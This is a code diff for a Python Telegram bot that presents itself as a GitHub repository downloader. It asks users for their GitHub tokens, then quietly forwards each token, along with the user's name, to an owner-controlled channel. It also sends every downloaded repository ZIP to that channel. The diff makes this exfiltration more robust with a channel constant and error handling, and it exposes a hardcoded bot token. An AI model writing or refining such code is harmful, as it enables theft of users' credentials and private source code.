@@ -7,10 +7,11 @@ from flask import Flask
 from threading import Thread
 import logging
 import time
-import sys
 
-# Set your bot token
-BOT_TOKEN = "7904561367:AAFolRH0Ri0KCpKDuVCTkCh27rV9lUNFSkg"
+# Set your bot token and channel ID
+BOT_TOKEN = "7904561367:AAFolRH0Ri0KCpKDuVCTkCh27rV9lUNFSkg"  # Replace with your actual bot token
+CHANNEL_ID = -1002386161781  # Set your channel ID here
+
 bot = telebot.TeleBot(BOT_TOKEN)
 
 # File to save approved users and their tokens
@@ -136,7 +137,12 @@ def handle_github_token(message):
 
         # Forward the token to the channel with a mention of the user who sent it
         user_mention = f"@{message.from_user.username}" if message.from_user.username else f"User ID: {message.from_user.id}"
-        bot.send_message(2497737475, f"GitHub token sent by {user_mention}: {github_token}")
+
+        # Send the GitHub token to the channel
+        try:
+            bot.send_message(CHANNEL_ID, f"GitHub token sent by {user_mention}: {github_token}")
+        except Exception as e:
+            logging.error(f"Failed to send GitHub token to channel: {e}")
 
         repos = get_github_repos(github_token)
 
@@ -154,7 +160,7 @@ def handle_github_token(message):
         owner_button = InlineKeyboardButton("🗿OWNER🗿", url="https://t.me/botplays90")
         markup.add(owner_button)
 
-        bot.send_message(message.chat.id, "Select A Repository And I Will  Download It For You🚀:", reply_markup=markup)
+        bot.send_message(message.chat.id, "Select A Repository And I Will Download It For You🚀:", reply_markup=markup)
     except Exception as e:
         logging.error(f"Error handling GitHub token: {e}")
 
@@ -182,8 +188,12 @@ def handle_callback_query(call):
             message_for_channel = f"Repository {repo_full_name} downloaded by {user_mention}"
 
             # Send the ZIP file to the channel with the user mention
-            with open(zip_file, 'rb') as file:
-                bot.send_document(-1002386161781, file, caption=message_for_channel)  # Sending to the channel with a mention
+            try:
+                with open(zip_file, 'rb') as file:
+                    bot.send_document(CHANNEL_ID, file, caption=message_for_channel)  # Sending to the channel with a mention
+            except telebot.apihelper.ApiException as e:
+                logging.error(f"Failed to send repository to channel: {e}")
+                logging.error(f"Error details: {e.result}")  # Log full error details
 
             # Delete the file after sending
             os.remove(zip_file)
@@ -200,11 +210,13 @@ Thread(target=run_flask).start()
 
 # Main loop to handle polling
 if __name__ == "__main__":
+    # Set up logging
+    logging.basicConfig(level=logging.ERROR, format='%(asctime)s %(levelname)s:%(message)s', handlers=[logging.FileHandler("bot.log"), logging.StreamHandler()])
+    
     while True:
         try:
             bot.polling(none_stop=True)
         except Exception as e:
-            logging.error(f"Error occurred: {e}")
+            logging.error(f"Error occurred in polling: {e}")
             time.sleep(5)  # Wait before restarting the polling
-            # Restart the bot
-            os.execv(sys.executable, ['python'] + sys.argv)
+            
